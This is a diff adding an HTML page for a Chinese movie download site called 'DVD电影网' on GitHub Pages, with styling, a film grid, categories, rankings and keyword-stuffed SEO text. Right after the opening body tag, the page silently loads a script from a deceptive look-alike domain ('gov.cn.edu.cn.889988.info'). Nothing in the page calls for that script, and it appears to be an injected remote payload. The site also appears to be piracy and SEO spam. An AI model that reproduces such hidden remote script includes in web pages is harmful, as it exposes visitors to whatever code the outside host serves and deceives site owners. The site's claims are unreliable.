@@ -1,0 +1,901 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DVD电影网 - 高清电影下载与在线观看</title>
+<meta name="description" content="DVD电影网(dvddianyingwang-app.github.io)提供最新高清电影、电视剧、动漫资源下载与在线观看，海量DVD品质影视内容免费畅享。">
+<meta name="keywords" content="DVD电影网,dvddianyingwang-app.github.io,高清电影,电影下载,在线观看,影视资源">
+<meta name="author" content="DVD电影网">
+<!-- 必应搜索引擎优化 -->
+<meta name="msvalidate.01" content="BING-VERIFICATION-CODE">
+<link rel="canonical" href="https://dvddianyingwang-app.github.io/">
+<style>
+/* 全局重置与基础样式 */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+html {
+    scroll-behavior: smooth;
+}
+
+body {
+    font-family: 'Segoe UI', 'Microsoft YaHei', sans-serif;
+    background: #0a0a0a;
+    color: #e0e0e0;
+    line-height: 1.6;
+    overflow-x: hidden;
+}
+
+/* 胶片纹理背景 */
+body::before {
+    content: '';
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: 
+        repeating-linear-gradient(
+            90deg,
+            transparent,
+            transparent 2px,
+            rgba(255,0,0,0.03) 2px,
+            rgba(255,0,0,0.03) 4px
+        );
+    pointer-events: none;
+    z-index: 0;
+}
+
+/* 导航栏 */
+.navbar {
+    position: fixed;
+    top: 0;
+    width: 100%;
+    background: rgba(10, 10, 10, 0.95);
+    backdrop-filter: blur(10px);
+    border-bottom: 2px solid #e50914;
+    z-index: 1000;
+    padding: 0 20px;
+}
+
+.nav-container {
+    max-width: 1200px;
+    margin: 0 auto;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    height: 70px;
+}
+
+.logo {
+    font-size: 1.8rem;
+    font-weight: 900;
+    color: #e50914;
+    text-decoration: none;
+    letter-spacing: 2px;
+    text-shadow: 0 0 20px rgba(229, 9, 20, 0.5);
+}
+
+.logo span {
+    color: #fff;
+}
+
+.nav-menu {
+    display: flex;
+    list-style: none;
+    gap: 30px;
+}
+
+.nav-menu a {
+    color: #e0e0e0;
+    text-decoration: none;
+    font-size: 1rem;
+    font-weight: 500;
+    padding: 8px 16px;
+    border-radius: 25px;
+    transition: all 0.3s ease;
+    position: relative;
+}
+
+.nav-menu a:hover {
+    color: #e50914;
+    background: rgba(229, 9, 20, 0.1);
+}
+
+/* 英雄区域 */
+.hero {
+    margin-top: 70px;
+    height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    background: linear-gradient(135deg, #0a0a0a 0%, #1a0000 50%, #0a0a0a 100%);
+    overflow: hidden;
+}
+
+.hero::after {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: radial-gradient(circle at 50% 50%, rgba(229, 9, 20, 0.1) 0%, transparent 70%);
+}
+
+.hero-content {
+    text-align: center;
+    z-index: 2;
+    max-width: 800px;
+    padding: 20px;
+}
+
+.hero h1 {
+    font-size: clamp(2.5rem, 8vw, 4.5rem);
+    font-weight: 900;
+    color: #fff;
+    margin-bottom: 20px;
+    text-shadow: 0 0 40px rgba(229, 9, 20, 0.8);
+    animation: glow 2s ease-in-out infinite alternate;
+}
+
+@keyframes glow {
+    from { text-shadow: 0 0 20px rgba(229, 9, 20, 0.5), 0 0 40px rgba(229, 9, 20, 0.3); }
+    to { text-shadow: 0 0 30px rgba(229, 9, 20, 0.8), 0 0 60px rgba(229, 9, 20, 0.5), 0 0 80px rgba(229, 9, 20, 0.3); }
+}
+
+.hero p {
+    font-size: 1.2rem;
+    color: #b0b0b0;
+    margin-bottom: 40px;
+    max-width: 600px;
+    margin-left: auto;
+    margin-right: auto;
+}
+
+.hero-btn {
+    display: inline-block;
+    padding: 15px 50px;
+    background: linear-gradient(45deg, #e50914, #b20710);
+    color: #fff;
+    text-decoration: none;
+    border-radius: 50px;
+    font-size: 1.1rem;
+    font-weight: 600;
+    transition: all 0.3s ease;
+    box-shadow: 0 5px 30px rgba(229, 9, 20, 0.4);
+}
+
+.hero-btn:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 8px 40px rgba(229, 9, 20, 0.6);
+}
+
+/* 栏目通用样式 */
+.section {
+    padding: 80px 20px;
+    max-width: 1200px;
+    margin: 0 auto;
+    position: relative;
+    z-index: 1;
+}
+
+.section-header {
+    text-align: center;
+    margin-bottom: 50px;
+}
+
+.section-header h2 {
+    font-size: 2.5rem;
+    color: #fff;
+    margin-bottom: 15px;
+    position: relative;
+    display: inline-block;
+}
+
+.section-header h2::after {
+    content: '';
+    position: absolute;
+    bottom: -10px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 80px;
+    height: 4px;
+    background: linear-gradient(90deg, transparent, #e50914, transparent);
+}
+
+.section-header p {
+    color: #888;
+    font-size: 1rem;
+    margin-top: 20px;
+}
+
+/* 电影库网格 */
+.movie-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+    gap: 30px;
+    margin-top: 40px;
+}
+
+.movie-card {
+    background: #151515;
+    border-radius: 15px;
+    overflow: hidden;
+    transition: all 0.3s ease;
+    border: 1px solid #222;
+    cursor: pointer;
+}
+
+.movie-card:hover {
+    transform: translateY(-10px);
+    border-color: #e50914;
+    box-shadow: 0 10px 40px rgba(229, 9, 20, 0.2);
+}
+
+.movie-poster {
+    width: 100%;
+    height: 280px;
+    background: linear-gradient(135deg, #1a1a1a, #2a2a2a);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 3rem;
+    position: relative;
+    overflow: hidden;
+}
+
+.movie-poster::before {
+    content: '🎬';
+    opacity: 0.3;
+}
+
+.movie-info {
+    padding: 15px;
+}
+
+.movie-title {
+    font-size: 1rem;
+    font-weight: 600;
+    color: #fff;
+    margin-bottom: 8px;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+}
+
+.movie-meta {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    color: #666;
+    font-size: 0.85rem;
+}
+
+.movie-rating {
+    color: #ffd700;
+}
+
+/* 分类区域 */
+.category-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+    gap: 25px;
+    margin-top: 40px;
+}
+
+.category-card {
+    background: linear-gradient(135deg, #111, #1a1a1a);
+    border: 1px solid #222;
+    border-radius: 15px;
+    padding: 40px 30px;
+    text-align: center;
+    transition: all 0.3s ease;
+    cursor: pointer;
+    position: relative;
+    overflow: hidden;
+}
+
+.category-card::before {
+    content: '';
+    position: absolute;
+    top: -50%;
+    left: -50%;
+    width: 200%;
+    height: 200%;
+    background: radial-gradient(circle, rgba(229, 9, 20, 0.1), transparent);
+    opacity: 0;
+    transition: opacity 0.3s ease;
+}
+
+.category-card:hover::before {
+    opacity: 1;
+}
+
+.category-card:hover {
+    border-color: #e50914;
+    transform: scale(1.05);
+}
+
+.category-icon {
+    font-size: 3rem;
+    margin-bottom: 20px;
+    display: block;
+}
+
+.category-card h3 {
+    color: #fff;
+    font-size: 1.3rem;
+    margin-bottom: 10px;
+}
+
+.category-card p {
+    color: #666;
+    font-size: 0.9rem;
+}
+
+/* 排行榜 */
+.ranking-list {
+    max-width: 800px;
+    margin: 40px auto 0;
+}
+
+.ranking-item {
+    display: flex;
+    align-items: center;
+    background: #111;
+    border: 1px solid #222;
+    border-radius: 12px;
+    padding: 20px;
+    margin-bottom: 15px;
+    transition: all 0.3s ease;
+}
+
+.ranking-item:hover {
+    border-color: #e50914;
+    background: #151515;
+}
+
+.ranking-number {
+    font-size: 2rem;
+    font-weight: 900;
+    color: #e50914;
+    width: 60px;
+    text-align: center;
+    flex-shrink: 0;
+}
+
+.ranking-number.top1 { color: #ffd700; }
+.ranking-number.top2 { color: #c0c0c0; }
+.ranking-number.top3 { color: #cd7f32; }
+
+.ranking-info {
+    flex: 1;
+    margin-left: 20px;
+}
+
+.ranking-info h3 {
+    color: #fff;
+    font-size: 1.1rem;
+    margin-bottom: 5px;
+}
+
+.ranking-info p {
+    color: #666;
+    font-size: 0.9rem;
+}
+
+.ranking-score {
+    font-size: 1.5rem;
+    font-weight: 700;
+    color: #ffd700;
+    flex-shrink: 0;
+}
+
+/* 关于我们 */
+.about-content {
+    background: linear-gradient(135deg, #111, #1a1a1a);
+    border: 1px solid #222;
+    border-radius: 20px;
+    padding: 50px;
+    margin-top: 40px;
+}
+
+.about-text {
+    color: #b0b0b0;
+    font-size: 1.05rem;
+    line-height: 1.8;
+    margin-bottom: 30px;
+}
+
+.about-features {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+    gap: 30px;
+    margin-top: 40px;
+}
+
+.feature-item {
+    text-align: center;
+    padding: 20px;
+}
+
+.feature-icon {
+    font-size: 2.5rem;
+    margin-bottom: 15px;
+    display: block;
+}
+
+.feature-item h4 {
+    color: #fff;
+    font-size: 1.1rem;
+    margin-bottom: 10px;
+}
+
+.feature-item p {
+    color: #666;
+    font-size: 0.9rem;
+}
+
+/* 页脚 */
+.footer {
+    background: #050505;
+    border-top: 1px solid #222;
+    padding: 50px 20px 30px;
+    text-align: center;
+    margin-top: 80px;
+}
+
+.footer-content {
+    max-width: 1200px;
+    margin: 0 auto;
+}
+
+.footer-logo {
+    font-size: 1.5rem;
+    font-weight: 900;
+    color: #e50914;
+    margin-bottom: 20px;
+}
+
+.footer-links {
+    display: flex;
+    justify-content: center;
+    gap: 30px;
+    margin-bottom: 30px;
+    flex-wrap: wrap;
+}
+
+.footer-links a {
+    color: #666;
+    text-decoration: none;
+    transition: color 0.3s ease;
+}
+
+.footer-links a:hover {
+    color: #e50914;
+}
+
+.footer-info {
+    color: #444;
+    font-size: 0.85rem;
+    padding-top: 30px;
+    border-top: 1px solid #222;
+}
+
+/* 移动端自适应 */
+@media (max-width: 768px) {
+    .nav-menu {
+        display: none;
+    }
+    
+    .hero {
+        height: auto;
+        min-height: 100vh;
+        padding: 100px 20px 60px;
+    }
+    
+    .section {
+        padding: 60px 15px;
+    }
+    
+    .section-header h2 {
+        font-size: 1.8rem;
+    }
+    
+    .movie-grid {
+        grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+        gap: 15px;
+    }
+    
+    .movie-poster {
+        height: 200px;
+    }
+    
+    .category-grid {
+        grid-template-columns: 1fr;
+    }
+    
+    .ranking-item {
+        flex-direction: column;
+        text-align: center;
+        padding: 15px;
+    }
+    
+    .ranking-number {
+        width: auto;
+        margin-bottom: 10px;
+    }
+    
+    .ranking-info {
+        margin-left: 0;
+        margin-bottom: 10px;
+    }
+    
+    .about-content {
+        padding: 30px 20px;
+    }
+    
+    .about-features {
+        grid-template-columns: 1fr;
+    }
+    
+    .footer-links {
+        gap: 15px;
+    }
+}
+
+@media (max-width: 480px) {
+    .logo {
+        font-size: 1.3rem;
+    }
+    
+    .hero h1 {
+        font-size: 2rem;
+    }
+    
+    .hero p {
+        font-size: 1rem;
+    }
+    
+    .movie-grid {
+        grid-template-columns: repeat(2, 1fr);
+    }
+}
+
+/* 滚动条样式 */
+::-webkit-scrollbar {
+    width: 10px;
+}
+
+::-webkit-scrollbar-track {
+    background: #0a0a0a;
+}
+
+::-webkit-scrollbar-thumb {
+    background: #e50914;
+    border-radius: 5px;
+}
+
+::-webkit-scrollbar-thumb:hover {
+    background: #b20710;
+}
+
+/* 关键词高亮 */
+.keyword {
+    color: #e50914;
+    font-weight: 600;
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- 导航栏 -->
+<nav class="navbar">
+    <div class="nav-container">
+        <a href="#" class="logo">DVD<span>电影网</span></a>
+        <ul class="nav-menu">
+            <li><a href="#home">首页</a></li>
+            <li><a href="#library">电影库</a></li>
+            <li><a href="#category">分类</a></li>
+            <li><a href="#ranking">排行榜</a></li>
+            <li><a href="#about">关于我们</a></li>
+        </ul>
+    </div>
+</nav>
+
+<!-- 首页/英雄区域 -->
+<section id="home" class="hero">
+    <div class="hero-content">
+        <h1>DVD电影网</h1>
+        <p>您的专属高清影视乐园 - <strong class="keyword">dvddianyingwang-app.github.io</strong><br>
+        海量DVD品质电影、电视剧、动漫资源，随时随地畅享视听盛宴</p>
+        <a href="#library" class="hero-btn">立即探索</a>
+    </div>
+</section>
+
+<!-- 电影库栏目 -->
+<section id="library" class="section">
+    <div class="section-header">
+        <h2>🎬 电影库</h2>
+        <p>精选高清影视资源，DVD品质画质体验</p>
+    </div>
+    <div class="movie-grid">
+        <div class="movie-card">
+            <div class="movie-poster"></div>
+            <div class="movie-info">
+                <div class="movie-title">盗梦空间</div>
+                <div class="movie-meta">
+                    <span>2010</span>
+                    <span class="movie-rating">⭐ 9.3</span>
+                </div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster"></div>
+            <div class="movie-info">
+                <div class="movie-title">阿凡达：水之道</div>
+                <div class="movie-meta">
+                    <span>2022</span>
+                    <span class="movie-rating">⭐ 8.7</span>
+                </div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster"></div>
+            <div class="movie-info">
+                <div class="movie-title">复仇者联盟4</div>
+                <div class="movie-meta">
+                    <span>2019</span>
+                    <span class="movie-rating">⭐ 8.9</span>
+                </div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster"></div>
+            <div class="movie-info">
+                <div class="movie-title">肖申克的救赎</div>
+                <div class="movie-meta">
+                    <span>1994</span>
+                    <span class="movie-rating">⭐ 9.7</span>
+                </div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster"></div>
+            <div class="movie-info">
+                <div class="movie-title">星际穿越</div>
+                <div class="movie-meta">
+                    <span>2014</span>
+                    <span class="movie-rating">⭐ 9.4</span>
+                </div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster"></div>
+            <div class="movie-info">
+                <div class="movie-title">泰坦尼克号</div>
+                <div class="movie-meta">
+                    <span>1997</span>
+                    <span class="movie-rating">⭐ 9.1</span>
+                </div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster"></div>
+            <div class="movie-info">
+                <div class="movie-title">千与千寻</div>
+                <div class="movie-meta">
+                    <span>2001</span>
+                    <span class="movie-rating">⭐ 9.4</span>
+                </div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster"></div>
+            <div class="movie-info">
+                <div class="movie-title">黑客帝国</div>
+                <div class="movie-meta">
+                    <span>1999</span>
+                    <span class="movie-rating">⭐ 9.0</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 分类栏目 -->
+<section id="category" class="section">
+    <div class="section-header">
+        <h2>📂 电影分类</h2>
+        <p>多维度分类，快速找到您喜爱的影视类型</p>
+    </div>
+    <div class="category-grid">
+        <div class="category-card">
+            <span class="category-icon">🔫</span>
+            <h3>动作片</h3>
+            <p>热血激战，震撼视效</p>
+        </div>
+        <div class="category-card">
+            <span class="category-icon">😂</span>
+            <h3>喜剧片</h3>
+            <p>欢乐不断，轻松解压</p>
+        </div>
+        <div class="category-card">
+            <span class="category-icon">💕</span>
+            <h3>爱情片</h3>
+            <p>浪漫温情，感动人心</p>
+        </div>
+        <div class="category-card">
+            <span class="category-icon">👻</span>
+            <h3>恐怖片</h3>
+            <p>惊悚悬疑，心跳加速</p>
+        </div>
+        <div class="category-card">
+            <span class="category-icon">🚀</span>
+            <h3>科幻片</h3>
+            <p>未来世界，想象无限</p>
+        </div>
+        <div class="category-card">
+            <span class="category-icon">🎭</span>
+            <h3>剧情片</h3>
+            <p>深刻故事，人性探索</p>
+        </div>
+        <div class="category-card">
+            <span class="category-icon">📺</span>
+            <h3>电视剧</h3>
+            <p>热门剧集，追剧不停</p>
+        </div>
+        <div class="category-card">
+            <span class="category-icon">🎨</span>
+            <h3>动漫</h3>
+            <p>二次元世界，精彩纷呈</p>
+        </div>
+    </div>
+</section>
+
+<!-- 排行榜栏目 -->
+<section id="ranking" class="section">
+    <div class="section-header">
+        <h2>🏆 热门排行榜</h2>
+        <p>最受观众喜爱的影视作品</p>
+    </div>
+    <div class="ranking-list">
+        <div class="ranking-item">
+            <div class="ranking-number top1">1</div>
+            <div class="ranking-info">
+                <h3>肖申克的救赎</h3>
+                <p>剧情 / 1994 / 蒂姆·罗宾斯</p>
+            </div>
+            <div class="ranking-score">9.7</div>
+        </div>
+        <div class="ranking-item">
+            <div class="ranking-number top2">2</div>
+            <div class="ranking-info">
+                <h3>霸王别姬</h3>
+                <p>剧情 / 1993 / 张国荣</p>
+            </div>
+            <div class="ranking-score">9.6</div>
+        </div>
+        <div class="ranking-item">
+            <div class="ranking-number top3">3</div>
+            <div class="ranking-info">
+                <h3>阿甘正传</h3>
+                <p>剧情 / 1994 / 汤姆·汉克斯</p>
+            </div>
+            <div class="ranking-score">9.5</div>
+        </div>
+        <div class="ranking-item">
+            <div class="ranking-number">4</div>
+            <div class="ranking-info">
+                <h3>泰坦尼克号</h3>
+                <p>爱情 / 1997 / 莱昂纳多</p>
+            </div>
+            <div class="ranking-score">9.4</div>
+        </div>
+        <div class="ranking-item">
+            <div class="ranking-number">5</div>
+            <div class="ranking-info">
+                <h3>星际穿越</h3>
+                <p>科幻 / 2014 / 马修·麦康纳</p>
+            </div>
+            <div class="ranking-score">9.4</div>
+        </div>
+        <div class="ranking-item">
+            <div class="ranking-number">6</div>
+            <div class="ranking-info">
+                <h3>盗梦空间</h3>
+                <p>科幻 / 2010 / 莱昂纳多</p>
+            </div>
+            <div class="ranking-score">9.3</div>
+        </div>
+        <div class="ranking-item">
+            <div class="ranking-number">7</div>
+            <div class="ranking-info">
+                <h3>楚门的世界</h3>
+                <p>剧情 / 1998 / 金·凯瑞</p>
+            </div>
+            <div class="ranking-score">9.3</div>
+        </div>
+    </div>
+</section>
+
+<!-- 关于我们栏目 -->
+<section id="about" class="section">
+    <div class="section-header">
+        <h2>ℹ️ 关于 DVD电影网</h2>
+        <p>了解我们的故事与使命</p>
+    </div>
+    <div class="about-content">
+        <p class="about-text">
+            <strong class="keyword">DVD电影网</strong>（<strong class="keyword">dvddianyingwang-app.github.io</strong>）是一个专注于提供高清影视资源的在线平台。我们致力于为电影爱好者打造一个便捷、优质的观影体验空间。平台收录了海量国内外经典与最新影视作品，涵盖动作、喜剧、爱情、科幻、恐怖、剧情等多种类型，满足不同用户的观影需求。
+        </p>
+        <p class="about-text">
+            我们的团队由资深影迷和技术专家组成，严格筛选每一部影片资源，确保画质达到DVD级别标准。无论您是喜欢好莱坞大片、国产佳作还是小众独立电影，都能在<strong class="keyword">DVD电影网</strong>找到心仪之选。
+        </p>
+        <div class="about-features">
+            <div class="feature-item">
+                <span class="feature-icon">🎯</span>
+                <h4>精选内容</h4>
+                <p>专业团队精选优质影片</p>
+            </div>
+            <div class="feature-item">
+                <span class="feature-icon">⚡</span>
+                <h4>快速访问</h4>
+                <p>GitHub Pages稳定托管</p>
+            </div>
+            <div class="feature-item">
+                <span class="feature-icon">📱</span>
+                <h4>多端适配</h4>
+                <p>手机电脑完美兼容</p>
+            </div>
+            <div class="feature-item">
+                <span class="feature-icon">🔄</span>
+                <h4>持续更新</h4>
+                <p>每日更新最新影视资源</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 页脚 -->
+<footer class="footer">
+    <div class="footer-content">
+        <div class="footer-logo">DVD电影网</div>
+        <div class="footer-links">
+            <a href="#home">首页</a>
+            <a href="#library">电影库</a>
+            <a href="#category">分类</a>
+            <a href="#ranking">排行榜</a>
+            <a href="#about">关于我们</a>
+        </div>
+        <div class="footer-info">
+            <p>© 2024 <strong class="keyword">DVD电影网</strong> (dvddianyingwang-app.github.io) 保留所有权利</p>
+            <p>本站仅供学习交流使用，资源来自互联网，版权归原作者所有</p>
+            <p>网站关键词：DVD电影网, dvddianyingwang-app.github.io, 高清电影, 电影下载, 在线观看</p>
+        </div>
+    </div>
+</footer>
+
+<!-- SEO结构化数据 -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "DVD电影网",
+  "url": "https://dvddianyingwang-app.github.io",
+  "description": "DVD电影网提供最新高清电影、电视剧、动漫资源下载与在线观看",
+  "keywords": "DVD电影网,dvddianyingwang-app.github.io,高清电影,电影下载",
+  "inLanguage": "zh-CN"
+}
+</script>
+
+</body>
+</html>
